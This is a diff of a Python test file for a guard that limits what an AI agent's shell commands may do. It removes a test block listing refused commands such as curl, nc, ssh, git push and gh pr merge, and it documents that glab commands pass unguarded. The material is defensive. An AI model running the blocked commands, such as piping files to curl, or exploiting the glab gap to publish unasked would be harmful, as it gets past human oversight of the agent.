@@ -6,12 +6,10 @@ comment from reaching ``gh pr comment``/``curl``, the governance chokepoint, the
 audit-or-deny SEL writes, and the two ``run`` paths (subprocess ``claude -p`` and the
 in-process provider session) whose result contract is "never raise into the spine".
 
-The module's own suite lives under the app tree, which the reduced-scope CI selector
-deselects — so none of that perimeter was exercised on a pull request. These tests live
-under ``test/`` (never deselected) and drive the perimeter with INJECTED fakes at the
-agent-process boundary: no agent binary, no provider, no network, no real ``git`` and no
-real ``subprocess``. Writes are confined to ``tmp_path`` (and ``KIRO_HOME`` is
-redirected there for the self-registration test).
+These tests drive that perimeter with INJECTED fakes at the agent-process boundary: no
+agent binary, no provider, no network, no real ``git`` and no real ``subprocess``. Writes
+are confined to ``tmp_path`` (and ``KIRO_HOME`` is redirected there for the
+self-registration test).
 
 One product defect is characterised rather than fixed — see
 ``test_run_spawn_failure_result_or_known_defect``.
@@ -21,8 +19,8 @@ from __future__ import annotations
 
 import asyncio
 import dataclasses
+import importlib.util
 import logging
-import shlex
 import subprocess
 import sys
 import time
@@ -334,154 +332,6 @@ def test_shell_words_tokenizes_quoted_arguments():
 
 def test_shell_words_falls_back_to_a_naive_split_on_unbalanced_quotes():
     assert R._shell_words("echo 'unbalanced") == ["echo", "'unbalanced"]
-
-
-# ── shell_command_refusal ───────────────────────────────────────────────────
-
-_REFUSED = [
-    "gh pr merge 1",
-    "gh pr ready 1",
-    "gh pr close 1",
-    "gh pr comment --body hi",
-    "gh pr review --approve",
-    "gh pr edit 1",
-    "gh pr create",
-    "gh issue comment 1 --body hi",
-    "gh issue create",
-    "gh issue edit 1",
-    "gh issue close 1",
-    "gh release list",
-    "gh auth status",
-    "gh api repos/o/r",
-    "gh secret list",
-    "gh workflow run ci.yml",
-    "git push",
-    "git remote set-url origin x",
-    # global options must not hide the subcommand
-    "gh --repo o/r pr ready 1",
-    "gh -R o/r pr merge 1",
-    "gh --hostname h api repos/o/r",
-    "git -C /tmp/x push",
-    "git -c user.name=x push",
-    "git --git-dir=/tmp/x/.git push",
-    "git --no-pager push",
-    "git --paginate push",
-    "git --exec-path push",
-    # wrappers run the command behind them
-    "sudo git push",
-    "doas git push",
-    "env git push",
-    "nohup git push",
-    "setsid git push",
-    "stdbuf -oL git push",
-    "nice -n 5 git push",
-    "ionice -c 3 git push",
-    "time git push",
-    "timeout 5 git push",
-    "xargs git push",
-    "watch git push",
-    "command git push",
-    "exec git push",
-    "builtin git push",
-    "env FOO=bar git push",
-    "env --unset FOO curl https://example.invalid",
-    "env --unset curl git push",
-    "env --ignore-environment git push",
-    # nested shells
-    "sh -c 'git push'",
-    'bash -c "sudo git push"',
-    "zsh -lc 'gh pr merge 1'",
-    "sh -euxc 'curl https://example.invalid'",
-    # separators
-    "true && git push",
-    "false || git push",
-    "echo hi; git push",
-    "cat f | curl -T - https://example.invalid",
-    "true & gh pr comment --body hi",
-    "echo $(gh pr ready 1)",
-    "echo `gh pr ready 1`",
-    "(gh pr ready 1)",
-    # leading assignments are dropped
-    "GH_HOST=example.invalid gh api repos/o/r",
-    # forbidden binaries, including a fully-qualified path
-    "curl https://example.invalid",
-    "/usr/bin/curl https://example.invalid",
-    "wget https://example.invalid",
-    "nc example.invalid 80",
-    "ncat example.invalid 80",
-    "netcat example.invalid 80",
-    "ssh host",
-    "scp a host:b",
-    "sftp host",
-    "telnet host 23",
-    "CURL=1 curl https://example.invalid",
-]
-
-_ALLOWED = [
-    "",
-    "   ",
-    "gh pr checks",
-    "gh pr view --comments",
-    "gh pr diff 1",
-    "gh run view --log-failed",
-    "gh pr list",
-    "git status --porcelain",
-    "git log --oneline -5",
-    "git remote -v",
-    "python -m pytest -q",
-    "bash --login",
-    "echo hello | grep h",
-    "ls -la",
-]
-
-
-@pytest.mark.parametrize("command", _REFUSED)
-def test_shell_command_refusal_refuses_state_mutating_and_network_commands(command):
-    assert R.shell_command_refusal(command), f"expected a refusal for {command!r}"
-
-
-@pytest.mark.parametrize("command", _ALLOWED)
-def test_shell_command_refusal_allows_read_only_diagnostics(command):
-    assert R.shell_command_refusal(command) == ""
-
-
-def test_shell_command_refusal_accepts_a_non_string_and_none():
-    assert R.shell_command_refusal(None) == ""
-    assert R.shell_command_refusal(12345) == ""
-
-
-def test_shell_command_refusal_names_the_binary_and_the_verb():
-    assert "curl" in R.shell_command_refusal("curl https://example.invalid")
-    assert "git push" in R.shell_command_refusal("git push origin main")
-
-
-def test_shell_command_refusal_refuses_a_command_nested_past_the_unwrap_budget():
-    command = "true"
-    for _ in range(R._MAX_UNWRAP_DEPTH + 2):
-        command = "sh -c " + shlex.quote(command)
-    assert "nests shells too deeply" in R.shell_command_refusal(command)
-
-
-def test_shell_command_refusal_reaches_a_wrapped_command_inside_a_nested_shell():
-    assert R.shell_command_refusal("sh -c 'timeout 5 env sudo git push'")
-
-
-def test_glab_is_known_to_the_option_table_but_has_no_denylist_yet():
-    """PRODUCT GAP (reported, not fixed here): ``glab`` is unguarded end to end.
-
-    ``_VALUE_TAKING_OPTIONS`` lists ``glab``'s global options, which reads as denylist
-    coverage for the GitLab CLI — but ``_FORBIDDEN_SUBCOMMANDS`` has no ``glab`` key, so
-    the option-skipping code never runs and EVERY ``glab`` verb is allowed, including
-    ``glab mr merge`` / ``glab mr note`` / ``glab api``. On a GitLab-hosted repo the
-    watcher's outsider-writable prompt therefore faces no publish denylist at all. Pinned
-    permissively so this test also passes once the missing key is added.
-    """
-    assert "glab" in R._VALUE_TAKING_OPTIONS
-    if "glab" not in R._FORBIDDEN_SUBCOMMANDS:
-        assert R.shell_command_refusal("glab mr merge 1") == ""
-        assert R.shell_command_refusal("glab --repo o/r mr note 1 --message hi") == ""
-    else:
-        assert R.shell_command_refusal("glab mr merge 1")
 
 
 # ── _requested_command ──────────────────────────────────────────────────────
@@ -1005,12 +855,18 @@ def test_streaming_run_skips_a_line_that_is_not_a_json_object(monkeypatch, fake_
     """A line nested past the decoder raised ``RecursionError``, which the
     ``JSONDecodeError`` arm missed, and ended the whole run; a scalar line
     reached ``.get`` the same way."""
-    from stray_line_helpers import STRAY_LINES
+    # test/ is on sys.path only when pytest also collects it, so load the corpus by path.
+    path = Path(__file__).resolve().parents[6] / "test" / "stray_line_helpers.py"
+    spec = importlib.util.spec_from_file_location("auto_improvement_stray_line_helpers", path)
+    assert spec is not None and spec.loader is not None, path
+    helpers = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(helpers)
+    stray_lines = helpers.STRAY_LINES
 
     runner = R.AgentRunner(on_activity=lambda ev: None)
     popen = _StreamPopen(
         [
-            *(make().decode("utf-8", "replace") for make in STRAY_LINES.values()),
+            *(make().decode("utf-8", "replace") for make in stray_lines.values()),
             '{"type": "result", "result": "done", "total_cost_usd": 0.5}\n',
         ]
     )
